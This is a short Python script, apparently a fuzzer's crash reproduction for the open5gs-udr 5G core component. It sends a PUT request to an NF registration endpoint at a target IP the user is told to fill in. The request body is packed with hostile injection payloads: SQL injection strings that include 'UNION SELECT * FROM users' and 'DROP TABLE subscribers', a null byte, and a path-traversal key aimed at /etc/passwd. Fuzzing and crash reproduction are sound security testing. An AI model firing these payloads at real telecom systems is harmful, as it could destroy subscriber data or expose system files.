#!/usr/bin/env python3
# Crash reproduction for open5gs-udr (info)
# Detected: Sat May  9 03:35:52 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/UPF-fuzz-3724'
body = b'{"nfInstanceId": "1\' UNION SELECT * FROM users--", "nfType": "\' OR \'1\'=\'1", "nfStatus": "\'; DROP TABLE subscribers; --", "ipv4Addresses": ["172.23.0.20"], "fqdn": "amf.open5gs.local", "priority": 2, "capacity": 200, "load": 50, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "supiOrSuci": "\' OR \'1\'=\'1", "\\u0000null_byte_372": "injected", "../../../etc/passwd": "path_traversal"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
